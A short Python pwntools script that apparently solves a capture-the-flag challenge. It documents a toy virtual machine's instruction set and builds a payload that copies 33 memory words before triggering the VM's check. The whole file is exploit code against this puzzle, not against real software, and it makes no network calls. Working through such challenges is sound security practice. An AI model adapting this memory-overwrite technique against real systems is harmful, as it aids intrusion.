from pwn import *

outfile = open("exploitstring", "wb")

# Description of VM instructions
# Instruction format: op rout rin1 rin2
# 0 rout rin1 rin2 => rout = rin1 + rin2        (add)
# 1 rout rin1 rin2 => rout = rin1 - rin2        (sub)
# 2 rout rin1 rin2 => rout = rin1 * rin2        (mul)
# 3 rout rin1 rin2 => rout = rin1 & rin2        (and)
# 4 rout rin1 rin2 => rout = rin1 | rin2        (or)
# 5 rout rin1 rin2 => mov rout <- mem [rin1]    (load)
# 6 rout rin1 rin2 => mov mem [rout] <- rin1    (store)
# 7 rout rin1 rin2 => Stop execution and proceed to check

# initially all registers except r5 have the value 0
# r5 initially has value 1

payload = b''
payload += b'4 2 5 2\n' # r2 = r2 | r5 (sets r2 to 1)
for i in range(0,5):
    payload += b'0 2 2 2\n' # r2 = r2 + r2
payload += b'0 2 2 5\n' # r2 = r2 + r5 (r2 = 33)

# We are just doing a memcpy of 33 integers
for i in range(0,33):
    payload += b'5 3 1 0\n' # mov r3 <- mem[r1]
    payload += b'6 2 3 0\n' # mov mem[r2] <- r3
    payload += b'0 1 1 5\n' # inc r1
    payload += b'0 2 2 5\n' # inc r2

payload += b'7 0 0 0\n' # proceed to check

outfile.write(payload)
